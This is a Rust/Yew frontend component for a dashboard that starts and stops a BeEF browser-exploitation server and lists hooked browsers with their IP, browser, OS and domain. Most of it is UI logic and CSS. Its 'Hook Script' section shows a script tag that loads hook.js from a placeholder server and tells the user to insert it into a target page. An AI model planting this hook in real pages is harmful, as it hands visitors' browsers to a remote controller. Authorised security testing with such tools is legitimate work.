//! 🕷️ BeEF Security Testing Dashboard

use crate::api::client::{self, BeefHookedBrowser, BeefStatusResponse};
use yew::prelude::*;

#[function_component(Security)]
pub fn security() -> Html {
    let lang = crate::i18n::use_lang();
    let strings = lang.strings();
    let status = use_state(|| None::<BeefStatusResponse>);
    let hooks = use_state(|| Vec::<BeefHookedBrowser>::new());
    let error = use_state(String::new);
    let success = use_state(String::new);
    let loading = use_state(|| false);

    // Fetch status on mount
    {
        let status = status.clone();
        let hooks = hooks.clone();
        let error = error.clone();
        use_effect_with((), move |_| {
            wasm_bindgen_futures::spawn_local(async move {
                match client::beef_status().await {
                    Ok(s) => status.set(Some(s)),
                    Err(e) => error.set(e),
                }
                match client::beef_hooks().await {
                    Ok(h) => hooks.set(h.browsers),
                    Err(_) => {}
                }
            });
            || ()
        });
    }

    // ── Action handlers ──
    let on_start = {
        let status = status.clone();
        let hooks = hooks.clone();
        let error = error.clone();
        let success = success.clone();
        let loading = loading.clone();
        Callback::from(move |_| {
            let s = status.clone();
            let _h = hooks.clone();
            let err = error.clone();
            let ok = success.clone();
            let ld = loading.clone();
            wasm_bindgen_futures::spawn_local(async move {
                ld.set(true);
                match client::beef_start().await {
                    Ok(resp) => {
                        ok.set(resp.message);
                        // Refresh status
                        match client::beef_status().await {
                            Ok(st) => s.set(Some(st)),
                            Err(e) => err.set(e),
                        }
                    }
                    Err(e) => err.set(e),
                }
                ld.set(false);
            });
        })
    };

    let on_stop = {
        let status = status.clone();
        let error = error.clone();
        let success = success.clone();
        let loading = loading.clone();
        Callback::from(move |_| {
            let s = status.clone();
            let err = error.clone();
            let ok = success.clone();
            let ld = loading.clone();
            wasm_bindgen_futures::spawn_local(async move {
                ld.set(true);
                match client::beef_stop().await {
                    Ok(resp) => {
                        ok.set(resp.message);
                        match client::beef_status().await {
                            Ok(st) => s.set(Some(st)),
                            Err(e) => err.set(e),
                        }
                    }
                    Err(e) => err.set(e),
                }
                ld.set(false);
            });
        })
    };

    let on_restart = {
        let status = status.clone();
        let error = error.clone();
        let success = success.clone();
        let loading = loading.clone();
        Callback::from(move |_| {
            let s = status.clone();
            let err = error.clone();
            let ok = success.clone();
            let ld = loading.clone();
            wasm_bindgen_futures::spawn_local(async move {
                ld.set(true);
                match client::beef_restart().await {
                    Ok(resp) => {
                        ok.set(resp.message);
                        match client::beef_status().await {
                            Ok(st) => s.set(Some(st)),
                            Err(e) => err.set(e),
                        }
                    }
                    Err(e) => err.set(e),
                }
                ld.set(false);
            });
        })
    };

    let is_running = status
        .as_ref()
        .map(|s| s.status == "running")
        .unwrap_or(false);
    let status_color = if is_running { "#3fb950" } else { "#f85149" };
    let status_text = if is_running { "Running" } else { "Stopped" };

    html! {
        <div class="page">
            <h1 class="page-title">{ "🕷️ BeEF Security Testing" }</h1>

            if !error.is_empty() {
                <div class="alert alert-error">{ error.as_str() }</div>
            }
            if !success.is_empty() {
                <div class="alert alert-success">{ success.as_str() }</div>
            }

            // ── Status Card ──
            <div class="beef-status-card" style={format!("border-left: 4px solid {}", status_color)}>
                <div class="beef-status-header">
                    <span class="beef-status-indicator" style={format!("background: {}", status_color)}></span>
                    <span class="beef-status-text" style={format!("color: {}", status_color)}>{ status_text }</span>
                </div>
                <div class="beef-status-details">
                    <div class="beef-detail-row">
                        <span class="detail-label">{"PID"}</span>
                        <span class="detail-value">{ status.as_ref().and_then(|s| s.pid).map(|p| p.to_string()).unwrap_or_else(|| "—".into()) }</span>
                    </div>
                    <div class="beef-detail-row">
                        <span class="detail-label">{"Port"}</span>
                        <span class="detail-value">{ status.as_ref().and_then(|s| s.port).map(|p| p.to_string()).unwrap_or_else(|| "3000".into()) }</span>
                    </div>
                    <div class="beef-detail-row">
                        <span class="detail-label">{"Hooked Browsers"}</span>
                        <span class="detail-value">{ status.as_ref().and_then(|s| s.hooked_browsers).map(|n| n.to_string()).unwrap_or_else(|| "0".into()) }</span>
                    </div>
                    <div class="beef-detail-row">
                        <span class="detail-label">{"Modules"}</span>
                        <span class="detail-value">{ status.as_ref().and_then(|s| s.modules_count).map(|n| n.to_string()).unwrap_or_else(|| "—".into()) }</span>
                    </div>
                    <div class="beef-detail-row">
                        <span class="detail-label">{"Uptime"}</span>
                        <span class="detail-value">{ status.as_ref().and_then(|s| s.uptime_secs).map(|u| format_uptime(u)).unwrap_or_else(|| "—".into()) }</span>
                    </div>
                </div>
                <div class="beef-actions">
                    if !is_running {
                        <button class="btn btn-success" onclick={on_start} disabled={*loading}>
                            { if *loading { "⏳ Starting..." } else { "▶️ Start BeEF" } }
                        </button>
                    } else {
                        <button class="btn btn-danger" onclick={on_stop} disabled={*loading}>
                            { if *loading { "⏳ Stopping..." } else { "⏹️ Stop BeEF" } }
                        </button>
                        <button class="btn btn-warning" onclick={on_restart} disabled={*loading}>
                            { if *loading { "⏳ Restarting..." } else { "🔄 Restart" } }
                        </button>
                    }
                </div>
            </div>

            // ── Hooked Browsers ──
            <div class="section">
                <h2>{ format!("🕸️ Hooked Browsers ({})", hooks.len()) }</h2>
                if hooks.is_empty() {
                    <div class="empty-state">{ "No browsers hooked yet. Deploy the BeEF hook script to start collecting browsers." }</div>
                } else {
                    <div class="hooks-table-wrapper">
                        <table class="hooks-table">
                            <thead>
                                <tr>
                                    <th>{ "IP" }</th>
                                    <th>{ "Browser" }</th>
                                    <th>{ "OS" }</th>
                                    <th>{ "Domain" }</th>
                                    <th>{ "Hooked At" }</th>
                                    <th>{ "Status" }</th>
                                </tr>
                            </thead>
                            <tbody>
                                { for hooks.iter().map(|b| {
                                    let status_class = if b.status.as_deref() == Some("online") { "hook-online" } else { "hook-offline" };
                                    html! {
                                        <tr>
                                            <td><code>{ &b.ip }</code></td>
                                            <td>{ &b.browser }</td>
                                            <td>{ &b.os }</td>
                                            <td>{ b.domain.as_deref().unwrap_or("—") }</td>
                                            <td class="hook-time">{ &b.hooked_at }</td>
                                            <td><span class={status_class}>{ b.status.as_deref().unwrap_or("unknown") }</span></td>
                                        </tr>
                                    }
                                })}
                            </tbody>
                        </table>
                    </div>
                }
            </div>

            // ── Hook Script Info ──
            <div class="section">
                <h2>{ "📜 Hook Script" }</h2>
                <div class="hook-script-card">
                    <p>{ "To hook a browser, include the following script tag in your target page:" }</p>
                    <pre class="hook-code"><code>{ r#"<script src="http://YOUR_SERVER_IP:3000/hook.js"></script>"# }</code></pre>
                    <p class="hook-note">{ "Replace YOUR_SERVER_IP with the actual IP of the BeEF server." }</p>
                </div>
            </div>

            <style>
                {r##"
.page { margin-left: 240px; padding: 2rem; }
.page-title { font-size: 1.5rem; margin-bottom: 1.5rem; color: #c9d1d9; }
.alert { padding: 0.5rem 1rem; border-radius: 6px; margin-bottom: 1rem; }
.alert-error { background: #f8514933; color: #f85149; }
.alert-success { background: #3fb95033; color: #3fb950; }
.section { margin-top: 2rem; }
.section h2 { font-size: 1.1rem; color: #c9d1d9; margin-bottom: 1rem; }

.beef-status-card {
  background: #161b22; border: 1px solid #30363d; border-radius: 10px;
  padding: 1.5rem; max-width: 550px;
}
.beef-status-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 1.2rem; }
.beef-status-indicator { width: 12px; height: 12px; border-radius: 50%; display: inline-block; }
.beef-status-text { font-size: 1.2rem; font-weight: 700; }
.beef-status-details { display: grid; grid-template-columns: 1fr 1fr; gap: 0.6rem; margin-bottom: 1.2rem; }
.beef-detail-row { display: flex; flex-direction: column; }
.detail-label { font-size: 0.75rem; color: #6e7681; text-transform: uppercase; letter-spacing: 0.04em; }
.detail-value { font-size: 1rem; color: #c9d1d9; font-weight: 600; }
.beef-actions { display: flex; gap: 0.5rem; }

.btn { border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; padding: 0.5rem 1.2rem; transition: opacity 0.15s; }
.btn:hover { opacity: 0.85; }
.btn:disabled { opacity: 0.5; cursor: not-allowed; }
.btn-success { background: #238636; color: #fff; }
.btn-danger { background: #da3633; color: #fff; }
.btn-warning { background: #d29922; color: #fff; }

.hooks-table-wrapper { overflow-x: auto; }
.hooks-table { width: 100%; border-collapse: collapse; }
.hooks-table th, .hooks-table td { text-align: left; padding: 0.5rem 0.8rem; border-bottom: 1px solid #21262d; }
.hooks-table th { color: #58a6ff; font-size: 0.8rem; text-transform: uppercase; }
.hooks-table td { color: #c9d1d9; font-size: 0.9rem; }
.hooks-table tr:hover td { background: #1c2128; }
.hook-time { font-family: monospace; font-size: 0.85rem; color: #8b949e; }
.hook-online { background: #3fb95033; color: #3fb950; padding: 0.1rem 0.4rem; border-radius: 4px; font-size: 0.8rem; }
.hook-offline { background: #6e768133; color: #6e7681; padding: 0.1rem 0.4rem; border-radius: 4px; font-size: 0.8rem; }
.empty-state { text-align: center; color: #6e7681; padding: 2rem; font-size: 0.95rem; }

.hook-script-card {
  background: #161b22; border: 1px solid #30363d; border-radius: 8px;
  padding: 1rem; max-width: 600px;
}
.hook-script-card p { margin: 0 0 0.5rem 0; color: #8b949e; font-size: 0.9rem; }
.hook-code {
  background: #0d1117; border: 1px solid #21262d; border-radius: 6px;
  padding: 0.8rem; overflow-x: auto; margin: 0.5rem 0;
}
.hook-code code { color: #58a6ff; font-size: 0.9rem; }
.hook-note { font-size: 0.85rem; color: #d29922; margin-top: 0.5rem !important; }
                "##}
            </style>
        </div>
    }
}

fn format_uptime(secs: u64) -> String {
    let h = secs / 3600;
    let m = (secs % 3600) / 60;
    let s = secs % 60;
    if h > 0 {
        format!("{h}h {m}m {s}s")
    } else if m > 0 {
        format!("{m}m {s}s")
    } else {
        format!("{s}s")
    }
}
